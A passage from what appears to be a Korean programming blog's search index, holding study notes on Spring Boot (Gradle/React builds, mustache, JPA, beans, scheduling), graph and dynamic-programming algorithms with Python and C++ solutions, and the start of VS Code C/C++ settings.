BasePlugin.BUILD_GROUP\rif(System.getProperty(\u0026#39;os.name\u0026#39;).toLowerCase(Locale.ROOT).contains(\u0026#39;windows\u0026#39;)){\rcommandLine \u0026#34;npm.cmd\u0026#34;, \u0026#34;run-script\u0026#34;, \u0026#34;build\u0026#34;\r}else{\rcommandLine \u0026#34;npm\u0026#34;, \u0026#34;run-script\u0026#34;, \u0026#34;build\u0026#34;\r}\r}\r// buildReact task를 호출\r// 앞서 지정한 $reactDir 경로의 /build 위치에서 생성된 데이터를 $projectDir/src/main/resources/static 로 복사\rtask copyReactBuildFiles(type:Copy) {\rdependsOn \u0026#34;buildReact\u0026#34;\rfrom \u0026#34;$reactDir/build\u0026#34;\rinto \u0026#34;$projectDir/src/main/resources/static\u0026#34;\r} 각종 설정을 해주는 batch 파일 예시이다.\ngradle wrapper\rgradlew build\r@REM package.json에 script 작성 필요\rnpm run build:postcss 폴더 설정\nresources : html, css 등 화면 구성을 위한 파일들의 root 디렉터리 resources/static : html파일에서 href로 참조하면 아래 디렉터리를 root로 경로 설정 가능 resources/template : mustache 파일에서 root 디렉터리로 사용 웹 서비스 개발 tomcat spring boot에서 web 패키지를 설치하면 tomcat을 사용하여 web server를 동작시킨다. localhost:8080으로 default 주소가 처리되어 있고, application.yml 파일에서 아래와 같이 수정 가능하다. server:\rport : 8081 MVC 모델 model, view, control 을 나누어 개발하는 형태를 MVC 모델이라고 한다. View template view template 은 controller와 model을 합친 개념으로, 화면을 구성하는 역할을 한다. mustache 패키지를 설치하여 view template를 만들 수 있다. jsp 활용\nSpring boot에는 jsp가 잘 어울리지 않는다고 한다. 대신 Thymleaf, mustache 등을 사용하는걸 권장한다?\njsp를 사용하여 model을 구성할 수도 있다.\njsp는 사용하기 전 application.properties(혹은 yml) 파일의 수정이 필요하다. 아래 내용을 추가한다.\nspring.mvc.view.prefix=/myApp/\rspring.mvc.view.suffix=.jsp 위 내용을 적용하면 src/main/webapp/myApp/ 경로 내부에서 jsp파일을 찾게 된다. \u0026lsquo;webapp\u0026rsquo; 폴더는 default로 필요하다.\nmustache 활용\n앞서 말헀듯 mustache는 view template용 패키지로 controller와 model을 관장한다.\ncontroller는 기본 패키지 경로 하위에 배치한다.\ncontroller는 다음과 같이 구성한다.\npackage com.example.firstproject.controller;\rimport org.springframework.stereotype.Controller;\rimport org.springframework.web.bind.annotation.GetMapping;\rimport org.springframework.ui.Model;\r@Controller // controller를 정의하는 annotation\rpublic class FirstController {\r@GetMapping(\u0026#34;/index\u0026#34;) // 연결될 url을 지정하는 annotation, /index 로 연결하면\rpublic String mainPage(Model model) // model 을 통해 가변 인자 control\r{\rmodel.addAttribute(\u0026#34;title\u0026#34;, \u0026#34;hello world\u0026#34;); // title 이름으로 hello world 라는 문자열을 설정\rreturn \u0026#34;mainPage\u0026#34;; // mainPage.mustache 파일과 연동\r}\r} model(.mustache .html 등)은 resources/templates 파일 경로 하위에 배치하고, 확장자를 .mustache로 지정한다.\nhtml 파일은 사실 view에 가깝지만, mustache 파일은 view에 변수를 적용하여 model에 해당한다.\nmodel은 다음과 같이 구성한다.\n\u0026lt;body\u0026gt;\r\u0026lt;h1\u0026gt;{{title}}\u0026lt;/h1\u0026gt; \u0026lt;!-- controller에서 정의한 title이 {{title}}에 치환됨 --\u0026gt;\r\u0026lt;/body\u0026gt; Layout\nmodel을 만들 때는 layout에 따라 화면에 보여지는 형태를 구성할 수 있다. layout을 template화 하여 사용 가능하다. 재사용 되는 부분을 모듈화 하여 파일로 분리하고, 이를 다른 파일에서 불러올 수 있다. {{\u0026gt;FILE_NAME}} 형태로 다른 파일을 호출해 올 수 있다. Controller Controller는 request를 받아 어떤 화면을 보여줄지 결정하는 routing 로직을 담당하게 된다. controller class는 @Controller annotation을 붙여서 선언하며 routing 함수로는 @GetMapping, @RequestMapping annotation을 사용하여 정의한다. 에러 화면 에러 화면도 controller에 의해 유도되며 BasicErrorController가 이를 담당한다. application.yml 파일에서 따로 설정을 하지 않았다면 server.error.path=/error 가 기본이다. JPA spring은 mysql, postgress, M2 등 여러 DB를 적용할 수 있다. controller는 Java로 구현되고, DB는 sql로 동작하기 때문에 java로 sql을 조작하기 위한 JPA라는 라이브러리가 필요하다. Entity : java 객체를 DB가 이해할 수 있게 재구성한 데이터 @Entity : 해당 class를 entity 로 선언 @Table(name=\u0026quot;\u0026quot;) : 특정 table과 객체를 연동. 기본적으로는 calss 이름에 해당하는 DB의 table과 매핑 된다. @Column : 지정한 변수를 DB의 컬럼으로 선언 Repository : entity를 DB에 저장하는 역할을 수행하는 객체 save(ENTITY) : 저장, DB의 insert / update 에 해당\ndelete(ENTITY) : 특정 Entity 삭제, DB의 delete에 해당\n상세 내용은 링크를 참조한다.\nJPA Usage Links\rJPA Repository Query function JPA Repository Query annotation JPA Repository get Top x result JPA update data from DTO DTO 정의\n서버의 Controller에서 이를 처리 가능하며, 사용자 입력을 Java Class로 대응시킨 형태를 DTO라 칭한다. DTO를 다음과 같이 정의하였다고 하자 class DtoSample {\rprivate String name;\rpublic DtoSample(String name) {\rthis.name = name;\r}\r} Entity 정의\nDTO에 해당하는 entity를 정의해야하며, 그 형태는 다음과 같다. entity는 @Entity annotation을 붙여야 한다. Entity는 primary key를 가져야 하며, 이는 @Id annotation으로 지정한다. DB의 column에 해당하는 값들은 @Column annotation을 붙여준다. @GeneratedValue는 자동으로 생성된 값이 들어가도록 한다. \u0026lsquo;실제 DB table\u0026rsquo; ⊃ \u0026lsquo;DTO에 정의된 column들\u0026rsquo; 이 성립해야 한다. @Entity\rpublic class sampleEntity {\r@Id // 대표값\r@GeneratedValue // 자동생성\rprivate Long id;\r@Column\rprivate String name;\rpublic sampleEntity(Long id, String name) {\rthis.id = id;\rthis.name = name;\r}\r} Repository 구현\nEntity를 DB에 저장하기 위한 Repository도 생성한다. repository는 entity로 DB에 접근하는 방법을 정의하기 위한 객체이다. spring에서 기본으로 제공하는 형태를 상속받아 사용도 가능하다. // CrudRepository\u0026lt;관리대상, 대표값의 type\u0026gt;\rpublic interface searchNameRepository extends CrudRepository\u0026lt;sampleEntity, Long\u0026gt; {\r// CrudRepository 의 기본값을 사용\r} 직접 구상한 쿼리를 사용하고 싶다면 camelcase로 구성된 함수 이름으로 쿼리를 추가할 수 있다.\nTips [no property ~ found for type ~ 오류 해결법](https://stackoverflow.com/questions/19733464/order-by-date-asc-with-spring-data)\rpublic interface searchNameRepository extends CrudRepository\u0026lt;SampleEntity, Long\u0026gt; {\r// select * from SampleEntity where name = ?1 @Query(\u0026#34;Select s From SampleEntity\u0026#34;)\rList\u0026lt;sampleEntity\u0026gt; findByName(String name);\r// select * from SampleEntity where name = ?1 and id = 1\r@Query(\u0026#34;Select s From SampleEntity where s.id = 1\u0026#34;)\rList\u0026lt;sampleEntity\u0026gt; findByName(String name);\r} 기타 추가작업\n이전에 만들었던 controller 에 내용을 추가한다. DTO로 받은 내용을 Entity로 변환시켜 repository를 통해 처리한다. @Autowired // String boot가 알아서 new 해서 사용하는 annotation\rsearchNameRepository snr;\r@PostMapping(\u0026#34;/data/part1\u0026#34;)\rpublic String handleForm(DtoSample dto) {\rsampleEntity name = dto.toEntity(); // toEntity 구현 필요\rname = snr.save(name); // \u0026#39;save\u0026#39;는 저장 및 저장된 데이터를 반환함\rreturn \u0026#34;returnView\u0026#34;;\r} contorller에서 받은 DTO 데이터를 entity로 변환시킬 때 사용한 toEntity() 함수를 구현해야 한다. DTO 파일을 추가로 수정한다. class DtoSample {\rprivate String name;\rpublic DtoSample(String name) {\rthis.name = name;\r}\rpublic sampleEntity toEntity() {\rreturn new sampleEntity(null, this.name); // id에 null을 넣는다. @GeneratedValue에 의해 자동으로 생성된다.\r}\r} 데이터 교환 view에서 사용자 입력을 받아 처리하는 과정을 다룬다. 앞서 JPA를 통해 구현한 DB 시스템에 데이터를 넣을 수 있다. view 구현 view쪽에서는 form 태그를 사용하여 controller에 데이터를 전송할 수 있다. form 태그의 인자로 action, method를 적용 가능하다. action : 데이터를 보낼 url을 설정. ex) action=\u0026quot;/data/part1\u0026quot; method : 전송 방법을 설정한다. post 혹은 get 적용 가능 form 태그 안의 input태그를 두고, 인자로 name을 설정한다. \u0026lt;form action=\u0026#34;/data/userRank\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt;\r\u0026lt;label\u0026gt;type your character name\u0026lt;/label\u0026gt;\r\u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;userName\u0026#34;\u0026gt;\r\u0026lt;br/\u0026gt;\r\u0026lt;button\u0026gt;see table\u0026lt;/button\u0026gt;\r\u0026lt;br/\u0026gt;\r\u0026lt;/form\u0026gt; controller 구현 DTO로 사용할 class를 선언한다. (ex: DtoSample) controller 를 구현한 java 파일에서 @PostMapping annotation을 달고, 인자로 위에서 선언한 DTO를 받는다. return 값으로 지정한 이름의 view로 redirect 한다. (ex: returnView) @PostMapping(\u0026#34;/data/part1\u0026#34;)\rpublic String handleForm(DtoSample dto) {\rreturn \u0026#34;returnView\u0026#34;;\r} parameter를 꼭 DTO 형태로 받지 않을 수도 있다. @RequestBody, @RequestParam annotation을 이용하여 데이터를 받을 수 있다. public String handleUserNameForm(@RequestBody String userName, Model model) {}\r// userName = \u0026#34;userName=TESTNAME\u0026#34; 과 같이 데이터가 받아진다. public String handleUserNameForm(@RequestParam String userName, Model model) {}\r// userName = \u0026#34;TESTNAME\u0026#34; 과 같이 데이터를 받을 수 있다. Bean Spring boot를 실행하면 container가 동작하는데, 이 container가 관리하는 객체를 bean이라고 한다. 선언\nComponent 사용 @Component annotation을 class에 붙여주면, 해당 class가 bean으로 등록된다. 직접 구현한 객체를 bean으로 적용할 떄 사용할 수 있다. @AutoWired annotation을 이용해 의존성을 정의할 수 있다. @Component\rclass C {\r// C가 bean으로 등록\rpublic C() {\rSystem.out.println(\u0026#34;use C as bean\u0026#34;);\r}\r@AutoWired\rprivate D d; // D 라는 class에 대한 dependency 정의\r} Bean 사용 @Configuration annotation을 class에 붙여주고, 해당 class에 선언된 함수에 @Bean annotation을 붙여준다. @Bean 이 붙은 함수에서 반환되는 값들은 모두 Bean으로 관리된다. 3rd party에서 구현된 객체를 bean으로 적용할 때 사용할 수 있다. bean으로 반환할 객체 생성자에 인자를 넣어 의존성을 정의할 수 있다. class Foo {\rpublic Foo() {\rSystem.out.println(\u0026#34;use Foo as bean\u0026#34;);\r}\r}\rclass Bar {\rpublic Bar() {\rSystem.out.println(\u0026#34;Bar as dependency\u0026#34;);\r}\r}\r@Configuration\rclass configure {\r@Bean\rpublic Bar bar() {\rreturn new Bar(); // Bar을 bean으로 선언\r}\r@Bean\rpublic Foo foo() {\rreturn new Foo(new Bar()); // Foo가 Bar의 의존성을 가짐을 표현\r}\r} spring은 @ComponentScan annotation이 붙은 class에서 component(bean)을 찾아가기 시작한다. spring 프로젝트를 생성하면 main 함수가 있는 class가 있는데, 이 clalss에 붙은 @SpringBootApplication annotation이 @ComponentScan annotation을 포함하고 있다. @Configuration annotation 도 @Component annotation을 포함하고 있어 scan 대상이 된다. @Controller 로 선언된 class들도 bean으로 관리되는데, 이는 @Controller가 @Component annotation을 포함하고 있기 때문이다. Annotation 및 기능 Value @Value annotation을 변수에 선언하면 프로젝트 설정파일(application.yml) 에서 변수를 가져올 수 있다. @Value(${server.port})\rprivate int port; Scheduled spring boot로 특정 주기마다 반복 동작을 수행하는 기능을 구현할 수 있다. main 함수가 선언된 class에 @EnableScheduling 을 선언한다. schedule을 관리할 class(Scheduler)를 선언하고, @Component annotation을 붙인다. 에서 생성한 Scheduler class에 함수를 선언하고, @Scheduled annotation을 붙인다. @Scheduled(cron = \u0026quot;1 2 3 4 5 ?\u0026quot;) : 매 5월4일3시2분1초 에 동작 숫자대신 *을 하면 모든 값에 동작하도록 설정 가능 앞에서부터 초,분,시,일,월,요일이며 요일은 0이 일요일 6이 토요일, 7또한 일요일이다. 상세 내용은 공식 document 참조 fixedDelay=1000 : 매 1초마다 동작(함수 종료 시점부터 1초) fixedRate=1000 : 매 1초마다 동작(함수 시작 시점부터 1초) SLF4J 로그를 쉽게 설정하기 위한 툴 참조한 사이트 https://allonsyit.tistory.com/43 https://galid1.tistory.com/494 https://atoz-develop.tistory.com/entry/Spring-%EC%8A%A4%ED%94%84%EB%A7%81-%EB%B9%88Bean%EC%9D%98-%EA%B0%9C%EB%85%90%EA%B3%BC-%EC%83%9D%EC%84%B1-%EC%9B%90%EB%A6%AC https://goateedev.tistory.com/128 https://itworldyo.tistory.com/40 https://docs.spring.io/spring-data/jpa/docs/current/reference/html/ ","permalink":"https://aswinblue.github.io/Blog/post/webserver/spring_boot/","summary":"Spring Boot Spring boot는 서버 생성을 위한 도구로, spring 프레임워크에 편의성을 향상시킨 프레임워크이다. Java, Kitlin, Groovy 등의 언어로 구현이 가능하다. 개발환경 java 기반으로 동작하기에 jdk 설치가 필요하다. (22년 기준) 11버전 이상을 다운받는것을 추천한다. IDE vs code를 사용한다면 확장패키지로 \u0026lsquo;Java Extension Pack\u0026rsquo; 과 \u0026lsquo;Spring Boot Extension Pack\u0026rsquo; 을 설치한다. java 개발을 위한 eclips나 intelliJ를 사용해도 된다. spring 프로젝트 생성 start.spring.io 페이지에 들어가면 프로젝트를 생성할 수 있는 UI가 구성되어 있다. 원하는대로 설정 후 다운로드를 받아서 사용하면 된다.","title":"Spring_boot"},{"content":"Algorithm 그래프 탐색 SP(Shortest Path) 단일 출발점에서 단일 목적지까지 최단 경로를 찾는 알고리즘\nDFS 용도 : 경로가 있는지 확인할 때 사용 가능 자로구조 : stack 방법 : 시작 node를 stack에 넣는다. stack이 모두 빌때까지 아래 동작을 반복한다. stack의 top을 현재 node로 설정한다. 현재 node를 \u0026lsquo;visited\u0026rsquo; 처리하고 stack에서 제거한다. 다음으로 이동할 node가 있는지 확인한다. 다음으로 이동할 node \u0026lsquo;A\u0026rsquo;가 있다면, 현재 node에서 그다음에 탐색할 방향을 stack에 push하고, node \u0026lsquo;A\u0026rsquo;도 stack에 push한다. 더이상 갈 곳이 없으면 현재 node의 visited 처리를 복원한다. 최종 목적지에 도달한 경우를 모아 결과값을 비교한다. 예시 : BFS 용도 : 최단경로 탐색에 사용 가능 자로구조 : queue 방법 : 시작 node를 queue에 넣는다. queue가 비거나 목적지에 도달할 때 까지 아래 동작을 반복한다. queue의 front를 pop 하여 현재 node로 설정한다. 현재 node에서 이동 가능한 node가 있는지 확인하고, 이동 가능하다면 모두 queue에 push한다. queue에 push하면서 해당 경로는 \u0026lsquo;visited\u0026rsquo; 처리를 한다. (주의) queue에 넣으면서 visited 처리를 하고, queue에 넣기전에 방문 여부를 판단해야 메모리 부족을 예방할 수 있다. SSSP (Single Source Shortest Path) 단일 출발점에서 모든 node까지 최단 경로를 찾는 알고리즘\nDijkstra 용도: cycle이 없는 graph 음수 node가 없는 graph 자료구조 : list, heap 방법: 출발점 S에서 각 node까지 거리를 list에 표현한다. 현재 S에서 최적의 거리를 가진 node M을 선택한다. (heap 사용) M을 거쳐서 각 node까지 이동하는 경로와 현재 list에 표기된 값을 비교해 최적을 선택한다. for (edge in graph[M]) { // M에서 발생되는 모든 edge들에 대해\rif (list[M] + edge.cost \u0026lt; list[edge.destination]) { // S -\u0026gt; * -\u0026gt; M -\u0026gt; T 까지 거리가 S -\u0026gt; * -\u0026gt; T 거리보다 짧다면\r// S -\u0026gt; * -\u0026gt; T 거리 = list[M], M -\u0026gt; T 거리 = edge.cost\rlist[edge.destination] = list[M] + edge.cost // 값 갱신\r} Bellman-Ford 용도: 자료구조: 방법: APSP (All Pair Shortest Path) 모든 node에서 모든 node로 가는 최적 경로를 찾는 알고리즘\nFloyd-Warshall 용도: 자료구조: 방법: Dynamic Programming 0 1 knapsack 용도 : 나눌수 없는 물건을 최대 무게 한도로 담고 싶을 때 사용 최소 단위로 나눌 수 있다면 greedy를 사용하면 된다. 자료구조: 2d array 방법: 2차원 배열 D를 선언한다. 행은 최대한도 k를 뜻하며, 열은 1부터 n번째 물건을 판단했을 때 최선의 값을 의미한다.\n최대 한도를 0부터 K까지 늘려가고, 모든 물건을 순회하며 가치(v)와 무게(w)를 고려해 아래 식을 체크한다.\n한도가 k일때 n번째 인자에 대해 D[k][n] = max(D[k - w[n]][n-1] + v[n], D[k - 1])[n-1]\n만약 w[n] \u0026gt; k 라면 그냥 D[k][n] = D[k - 1][n-1]\n2차원배열 대신 1차원 배열을 사용하면, 이미 선택한 인자를 중복해서 선택하게 되므로 오답\n2차원 배열에서 첫 열과 첫 행의 값은 0으로 세팅해 주어야 한다. (아무것도 담지 않은/못한 상황)\n예시: # https://www.acmicpc.net/submit/12865\rif __name__ == \u0026#39;__main__\u0026#39;:\rN, K = map(int, input().split())\rW = [0]\rV = [0]\rfor i in range(N):\rw, v = map(int, input().split())\rW.append(w)\rV.append(v)\rresult = [[0 for j in range(N+1)] for i in range(K+1)]\r# 배낭의 한계를 를 1부터 증가시켜가며 dynamic programming을 수행한다.\rfor i in range(1, K+1):\r# 모든 물건에 대해 물건을 넣었을 때와 넣지 않았을 때를 확인한다.\rfor j in range(1, N+1):\rif W[j] \u0026lt;= i:\r# 확인 결과 더 최선의 값을 도출한다.\rresult[i][j] = max(result[i - W[j]][j-1] + V[j], result[i][j-1]) # 넣었을때 vs 넣지 않았을 때\relse:\rresult[i][j] = result[i][j-1]\rprint(result[K][N]) 순서 정렬 minHeap + maxHeap maxHeap + minHeap 을 사용하여 \u0026lsquo;상위 n개의 데이터\u0026rsquo; 혹은 \u0026lsquo;중앙 값\u0026rsquo;을 구할 수 있다. 아래와 같이 top과 top이 마주보는 구조로 minHeap과 maxHeap을 사용한다. https://www.acmicpc.net/problem/1655\r/*\r* by using two heap(minH, maxH), always can get middle value at maxH.top()\r*\r* (maxH) (minH)\r* input -\u0026gt; [ a1, a2, a3, ... an(top)] [ b1(top), b2, b3, .. bm]\r* ^\r* middle value\r*/ 규칙 찾기 정해진 공식을 대입하는것이 아닌, 문제에서 규칙을 찾아 해결하는 방식 키보드 좌표계\n키보드 자판을 보면 행은 똑바르지만, 열은 살짝 어긋나있다. S를 보면 Q,W,E,A,D,Z,X,C 와 접해있다. 한 버튼에서 다른 버튼까지 이동하는데 걸리는 시간을 계산한다 해 보자. Q에서 E까지는 2번, Q에서 D까지는 3번, Q에서 X까지는 3번에 걸쳐 이동할 수 있다. 이러한 좌표에서 특정 문자를 입력하기 위해 각 자판을 이동하는데 걸리는 시간을 계산한다면? 통용되는 규칙을 찾아서 해결한 경우\nPython Code\rdef solve():\r# 키보드 배열을 좌표평면으로 본다. # Q를 (0,2)로, W를 (2,2) E를 (4,2) ...\r# A를 (1,1), S를 (3,1), D를 (5,1) ...\r# Z를 (2,0), X를 (4,0), C를 (6,0) ...\r# 이후 x좌표 거리를 2로 나누고 y좌표 거리를 더한 후, y 좌표의 거리를 2로 나눈 값을 빼주면 실제 이동 거리가 나온다. # 단, x좌표가 동일할 경우에는 예외로 y좌표 거리가 실제 이동 거리이다. # 이는 y좌표가 3 초과여도 적용되는 규칙이다.\r# ex1) Q(0,2) -\u0026gt; C(6,0) = (6/2 + 2) - 2/2 = 4\r# ex2) T(8,2) -\u0026gt; V(8,0) = (0 + 2) = 2\t(예외)\r# ex3) Q(0,2) -\u0026gt; T(8,2) = (8/2 + 0) - 0 = 4\rcoord = {}\rkey3 = ['Q','W','E','R','T','Y','U','I','O','P']\rkey2 = ['A','S','D','F','G','H','J','K','L']\rkey1 = ['Z','X','C','V','B','N','M']\rMOVING_TIME = 2\rTYPING_TIME = 1\rfor i in range(len(key3)):\rcoord[key3[i]] = (i * 2, 2)\rfor i in range(len(key2)):\rcoord[key2[i]] = (i * 2 + 1, 1)\rfor i in range(len(key1)):\rcoord[key1[i]] = (i * 2 + 2, 0)\rword = input()\rtime = len(word) * TYPING_TIME # time elapsed when typing\rprev = None\r# for all words, calculate distance\rfor w in word:\rif prev is None:\rprev = w\rcontinue\rstart = coord[prev]\rend = coord[w]\r# rule exception\rif start[0] == end[0]:\rtime += abs(end[1] - start[1]) * MOVING_TIME\rprev = w\rcontinue\r# time eplased when moving\rtime += (abs(end[0] - start[0]) // 2 + abs(end[1] - start[1]) - abs(end[1] - start[1]) // 2) * MOVING_TIME\r# settings for next cycle\rprev = w\rprint(time)\rif __name__ == '__main__':\rT = int(input())\rfor t in range(T):\rsolve()\r모든 case를 구분하여 해결한 경우\nC++ Code\r#include \u0026lt;map\u0026gt;\r#include \u0026lt;iostream\u0026gt;\r#define DEBUG 0\rusing namespace std;\rint main(void) {\r// initialize keyboard array\rmap\u0026lt;char,pair\u0026lt;int,int\u0026gt;\u0026gt; qwerty;\rchar row1[] = {'Q','W','E','R','T','Y','U','I','O','P'};\rchar row2[] = {'A','S','D','F','G','H','J','K','L'};\rchar row3[] = {'Z','X','C','V','B','N','M'};\rfor (int i = 0; i \u0026lt; (int)sizeof(row1); i++) {\rqwerty.insert(make_pair(row1[i], make_pair(0, i)));\r}\rfor (int i = 0; i \u0026lt; (int)sizeof(row2); i++) {\rqwerty.insert(make_pair(row2[i], make_pair(1, i)));\r}\rfor (int i = 0; i \u0026lt; (int)sizeof(row3); i++) {\rqwerty.insert(make_pair(row3[i], make_pair(2, i)));\r}\r#if DEBUG\rfor (int i = 0; i \u0026lt; (int)sizeof(row1); i++) {\rcout \u0026lt;\u0026lt; qwerty[row1[i]].first \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; qwerty[row1[i]].second \u0026lt;\u0026lt; \u0026quot; \u0026quot;;\r}\rcout \u0026lt;\u0026lt; endl;\rfor (int i = 0; i \u0026lt; (int)sizeof(row2); i++) {\rcout \u0026lt;\u0026lt; qwerty[row2[i]].first \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; qwerty[row2[i]].second \u0026lt;\u0026lt; \u0026quot; \u0026quot;;\r}\rcout \u0026lt;\u0026lt; endl;\rfor (int i = 0; i \u0026lt; (int)sizeof(row3); i++) {\rcout \u0026lt;\u0026lt; qwerty[row3[i]].first \u0026lt;\u0026lt; \u0026quot; \u0026quot; \u0026lt;\u0026lt; qwerty[row3[i]].second \u0026lt;\u0026lt; \u0026quot; \u0026quot;;\r}\rcout \u0026lt;\u0026lt; endl;\r#endif\r// get input\rint T;\rchar txt[110];\rcin \u0026gt;\u0026gt; T;\rfor (int t = 0; t \u0026lt; T; t++) {\rcin \u0026gt;\u0026gt; txt;\r// calculate result\rint total_diff = 0;\rint pre_row = qwerty[txt[0]].first;\rint pre_col = qwerty[txt[0]].second;\rint idx = 1;\rwhile(txt[idx]) {\rint row = qwerty[txt[idx]].first;\rint col = qwerty[txt[idx]].second;\rint diff_row = abs(row - pre_row);\rint diff_col = abs(col - pre_col);\r// ↔ direction\rif (diff_row == 0) {\rtotal_diff += diff_col;\r}\r// ↕ direction\relse if (diff_col == 0) {\rtotal_diff += diff_row;\r}\r// ↙ direction\relse if (col \u0026lt; pre_col \u0026amp;\u0026amp; row \u0026gt; pre_row) {\rtotal_diff += max(diff_row, diff_col);\r}\r// ↗ direction\relse if (col \u0026gt; pre_col \u0026amp;\u0026amp; row \u0026lt; pre_row) {\rtotal_diff += max(diff_row, diff_col);\r}\r// ↘ direction\relse if (col \u0026gt; pre_col \u0026amp;\u0026amp; row \u0026gt; pre_row) {\rtotal_diff += diff_row + diff_col;\r}\r// ↖ direction\relse {\rtotal_diff += diff_row + diff_col;\r}\r# if DEBUG\rcout \u0026lt;\u0026lt; \u0026quot;row: \u0026quot; \u0026lt;\u0026lt; row \u0026lt;\u0026lt; \u0026quot; col: \u0026quot; \u0026lt;\u0026lt; col\r\u0026lt;\u0026lt; \u0026quot; diff_row: \u0026quot; \u0026lt;\u0026lt; diff_row \u0026lt;\u0026lt; \u0026quot; diff_col: \u0026quot; \u0026lt;\u0026lt; diff_col\r\u0026lt;\u0026lt; \u0026quot; idx: \u0026quot; \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; \u0026quot; total_diff: \u0026quot; \u0026lt;\u0026lt; total_diff \u0026lt;\u0026lt; endl;\r# endif\r++idx;\rpre_row = row;\rpre_col = col;\r} // -\u0026gt; while\r// print result\rcout \u0026lt;\u0026lt; idx + total_diff * 2 \u0026lt;\u0026lt; endl;\r} // -\u0026gt; for\r} // -\u0026gt; main\r두 수의 곱이 최대가 나오도록 숫자 배정\n가장 큰 결과값이 나오도록 두 수를 정의하려면,\n높은 자리수가 낮은자리 수보다 값이 커야한다. (21 * 43 \u0026gt; 12 * 34) 두 수의 길이가 같을수록 두 수의 곱은 크다. (12 * 34 \u0026gt; 123 * 4) C++ Code\r#include \u0026lt;iostream\u0026gt;\r#include \u0026lt;cstring\u0026gt;\r#define DEBUG 0\rusing namespace std;\rint main(void) {\rint T = 0;\rcin \u0026gt;\u0026gt; T;\rfor (int t = 0; t \u0026lt; T; ++t) {\r// 1. get inputs\rchar card[20] = {0,};\rcin \u0026gt;\u0026gt; card;\rint card_len = strlen(card);\r# if DEBUG\rcout \u0026lt;\u0026lt; \u0026#34;len : \u0026#34; \u0026lt;\u0026lt; card_len \u0026lt;\u0026lt; endl;\r# endif\rint number[10] = {0,};\rfor (char c : card) {\rnumber[c - \u0026#39;0\u0026#39;] += 1;\r}\r// change all \u0026#39;6\u0026#39; into \u0026#39;9\u0026#39;\rnumber[9] += number[6];\rnumber[6] = 0;\r// 2. divide into two number\rint idx = 9;\rbool flag = false;\r// find max number\rwhile (number[idx] == 0) idx--;\rnumber[idx] -= 1;\runsigned long long num1 = idx;\runsigned long long num2 = 0;\rint l = 1;\rwhile (l \u0026lt; card_len) {\rwhile (number[idx] == 0) idx--;\rnumber[idx] -= 1;\r// 다음 숫자를 어디에 이어붙일지 결정\r// 이전 조합이 최적이라면, 아래 두 번의 비교를 통해 도출된 두 숫자 조합도 최적값임이 보장된다. unsigned long long cmp1 = (num1 * 10 + idx) * num2;\runsigned long long cmp2 = (num2 * 10 + idx) * num1;\rif (cmp1 \u0026gt; cmp2) {\rnum1 = num1 * 10 + idx;\r}\relse {\rnum2 = num2 * 10 + idx;\r}\r++l;\r/*\r// num1 : max, max-3, max-4, max-7, max-8 ...\r// num2 : max-1, max-2, max-5, max-6, ...\rfor (int i = 0; i \u0026lt; 2; ++i) {\rwhile (number[idx] == 0) idx--;\rnumber[idx] -= 1;\rif (flag) {\rnum1 = num1 * 10 + idx;\r}\relse {\rnum2 = num2 * 10 + idx;\r}\r# if DEBUG\rcout \u0026lt;\u0026lt; l \u0026lt;\u0026lt; \u0026#34; / num : \u0026#34; \u0026lt;\u0026lt; num1 \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; num2 \u0026lt;\u0026lt; endl;\r# endif\r// check condition\rl += 1;\rif (l \u0026gt;= card_len) break;\r} // -\u0026gt; for i\rflag = !flag;\r*/\r} // -\u0026gt; while card_len\rcout \u0026lt;\u0026lt; num1 * num2 \u0026lt;\u0026lt; endl;\r} // -\u0026gt; for T\r} ","permalink":"https://aswinblue.github.io/Blog/post/algorithm/algorithm/","summary":"Algorithm 그래프 탐색 SP(Shortest Path) 단일 출발점에서 단일 목적지까지 최단 경로를 찾는 알고리즘\nDFS 용도 : 경로가 있는지 확인할 때 사용 가능 자로구조 : stack 방법 : 시작 node를 stack에 넣는다. stack이 모두 빌때까지 아래 동작을 반복한다. stack의 top을 현재 node로 설정한다. 현재 node를 \u0026lsquo;visited\u0026rsquo; 처리하고 stack에서 제거한다. 다음으로 이동할 node가 있는지 확인한다. 다음으로 이동할 node \u0026lsquo;A\u0026rsquo;가 있다면, 현재 node에서 그다음에 탐색할 방향을 stack에 push하고, node \u0026lsquo;A\u0026rsquo;도 stack에 push한다. 더이상 갈 곳이 없으면 현재 node의 visited 처리를 복원한다.","title":"Algorithm"},{"content":"VS code visual studio code 사용법 개발환경 C / C++ 컴파일러 gcc 혹은 mingw 설치가 필요하다. 인터넷에서 설치하도록 한다. 설정파일 컴파일 및 실행을 위해서는 launch.json, setting.json, tasks.json 파일이 필요하다. vs code에서 알아서 작성해 주지만, 기본 설정으로 부족한 부분은 수정해야 한다. # settings.json\r{\r\u0026#34;C_Cpp_Runner.cStandard\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.cppStandard\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.msvcBatchPath\u0026#34;: \u0026#34;\u0026#34;,\r\u0026#34;C_Cpp_Runner.warnings\u0026#34;: [\r\u0026#34;-Wall\u0026#34;,\r\u0026#34;-Wextra\u0026#34;,\r\u0026#34;-Wpedantic\u0026#34;\r],\r\u0026#34;C_Cpp_Runner.enableWarnings\u0026#34;: true,\r\u0026#34;C_Cpp_Runner.warningsAsError\u0026#34;: false,\r\u0026#34;C_Cpp_Runner.compilerArgs\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.linkerArgs\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.includePaths\u0026#34;: [],\r\u0026#34;C_Cpp_Runner.includeSearch\u0026#34;: [\r\u0026#34;*\u0026#34;,\r\u0026#34;**/*\u0026#34;\r],\r\u0026#34;C_Cpp_Runner.excludeSearch\u0026#34;: [\r\u0026#34;**/build\u0026#34;,\r\u0026#34;**/build/**\u0026#34;,\r\u0026#34;**/.*\u0026#34;,\r\u0026#34;**/.*/**\u0026#34;,\r\u0026#34;**/.vscode\u0026#34;,\r\u0026#34;**/.vscode/**\u0026#34;\r],\r\u0026#34;C_Cpp_Runner.cCompilerPath\u0026#34;: \u0026#34;gcc\u0026#34;,\r\u0026#34;C_Cpp_Runner.cppCompilerPath\u0026#34;: \u0026#34;C:/Program Files 